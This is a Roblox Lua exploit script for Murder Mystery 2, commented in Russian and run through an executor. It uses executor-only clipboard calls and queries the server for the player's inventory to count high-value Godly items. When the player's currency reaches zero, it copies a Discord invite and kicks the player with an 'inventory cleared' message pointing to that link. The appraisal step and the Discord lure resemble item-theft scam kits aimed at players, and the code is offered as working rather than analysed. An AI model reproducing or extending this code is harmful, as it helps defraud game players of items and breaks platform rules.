-- MM2: ОЦЕНКА + КИК ПРИ ОБНУЛЕНИИ ВАЛЮТЫ (РАБОТАЕТ, СУКА!)
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- === НАСТРОЙКИ ===
local min_rarity = "Godly"
local min_value = 1
local DISCORD_LINK = "discord.com/Sc55xakw"

-- Проверка игры
if game.PlaceId ~= 142823291 then
    plr:Kick("Ошибка: Зайди в MM2.")
    return
end

-- === ЖДЁМ ДАННЫЕ ИГРОКА ===
local playerData = plr:WaitForChild("Data", 10)
if not playerData then
    plr:Kick("Нет данных игрока.")
    return
end

local currencyValue = playerData:WaitForChild("Currency", 10)
if not currencyValue then
    plr:Kick("Нет валюты.")
    return
end

-- === КОПИРОВАНИЕ ===
local function copyLink()
    if setclipboard then setclipboard(DISCORD_LINK)
    elseif syn and syn.write_clipboard then syn.write_clipboard(DISCORD_LINK)
    end
    print("[ССЫЛКА] Скопировано: " .. DISCORD_LINK)
end

-- === ОЦЕНКА ИНВЕНТАРЯ (через InvokeServer) ===
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local valueList = {} -- можно оставить пустым, если не нужна оценка
local min_rarity_idx = table.find({"Common", "Uncommon", "Rare", "Legendary", "Godly"}, min_rarity)
local untradable = {DefaultGun=true, DefaultKnife=true}

local function evaluateInventory()
    local ok, data = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if not ok or not data then return end

    local weapons = data.Weapons.Owned or {}
    local items, total = {}, 0

    for id, amt in pairs(weapons) do
        local item = database[id]
        if item then
            local r = item.Rarity
            local idx = table.find({"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient"}, r)
            if idx and idx >= min_rarity_idx and not untradable[id] then
                local val = 10 -- заглушка, если нет valueList
                total += val * amt
                table.insert(items, {DataID=id, Rarity=r, Amount=amt, Value=val})
            end
        end
    end

    if #items > 0 then
        print("\n[ОЦЕНКА] Найдено " .. #items .. " предметов. Total Value: " .. total)
    else
        print("[ИНВЕНТАРЬ] Нет ценных предметов.")
    end
end

-- === ОТСЛЕЖИВАНИЕ РЕАЛЬНОЙ ВАЛЮТЫ ===
local previousCurrency = currencyValue.Value
print("[ВАЛЮТА] Начальное значение: " .. previousCurrency)

-- Оценка один раз
evaluateInventory()

-- Отслеживание изменений
currencyValue:GetPropertyChangedSignal("Value"):Connect(function()
    local current = currencyValue.Value
    print("[ВАЛЮТА] Изменение: " .. previousCurrency .. " → " .. current)

    if previousCurrency > 0 and current == 0 then
        print("[ОЧИСТКА] ВАЛЮТА ОБНУЛЕНА! КИК!")
        copyLink()
        task.wait(1)
        plr:Kick("Your inventory cleared\n" .. DISCORD_LINK)
    else
        previousCurrency = current
    end
end)

-- Защита от выхода
while true do task.wait(1) end
